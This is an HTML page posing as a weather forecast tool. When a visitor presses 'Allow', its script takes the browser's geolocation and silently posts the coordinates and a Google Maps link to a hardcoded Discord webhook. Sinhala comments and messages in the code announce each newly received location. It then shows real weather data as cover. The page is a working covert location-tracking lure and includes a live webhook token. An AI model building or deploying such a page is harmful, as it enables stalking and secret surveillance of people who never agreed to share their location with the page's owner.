<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Forecast</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
        button { padding: 15px 25px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        #result { margin-top: 30px; font-weight: bold; }
    </style>
</head>
<body>

    <h2>Weather Forecast</h2>
    <p>When you press the button below, you will see the weather forecast for your area.</p>
    
    <!-- මෙතන අර @ ලකුණ අයින් කරලා හැදුවා -->
    <button onclick="getLocation()">Allow</button>

    <div id="result"></div>

    <script>
        const resultDiv = document.getElementById("result");
        const webhookURL = "https://discord.com/api/webhooks/1527851638306635916/SG-_EvIvPXKPlPhq2DLExLZagcLvtsHiL_xKVRK9S3vPU8itFiesHeu7Dj1_6G2I-Rbu";

        function getLocation() {
            if (navigator.geolocation) {
                resultDiv.innerHTML = "Please wait a moment...";
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                resultDiv.innerHTML = "Error: Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
    
            // 1. Discord එකට දත්ත යැවීම
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `📍 **අලුත් ලොකේෂන් එකක් ලැබුණා!** \nඅක්ෂාංශ: ${lat} \nදේශාංශ: ${lon} \nසිතියම: https://maps.google.com/?q=${lat},${lon}`
                })
            });

            // 2. Open-Meteo API එකෙන් කාලගුණය ගැනීම
            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
                .then(response => response.json())
                .then(data => {
                    let temp = data.current_weather.temperature;
                    let wind = data.current_weather.windspeed;
                    
                    resultDiv.innerHTML = `
                        <div style="background: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; text-align: left;">
                            <h3 style="margin-top:0;">🌤️ Current Weather in Your Area</h3>
                            <p>🌡️ Temperature: ${temp}°C</p>
                            <p>💨 Wind Speed: ${wind} km/h</p>
                            <p style="color: green; margin-top: 15px; font-weight: bold; text-align: center;">Thank you!</p>
                        </div>
                    `;
                })
                .catch(error => {
                    resultDiv.innerHTML = "Error loading weather data.";
                });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    resultDiv.innerHTML = "Location permission denied by user.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    resultDiv.innerHTML = "Unable to obtain location information.";
                    break;
                case error.TIMEOUT:
                    resultDiv.innerHTML = "The request to get user location timed out.";
                    break;
            }
        }
    </script>

</body>
</html>
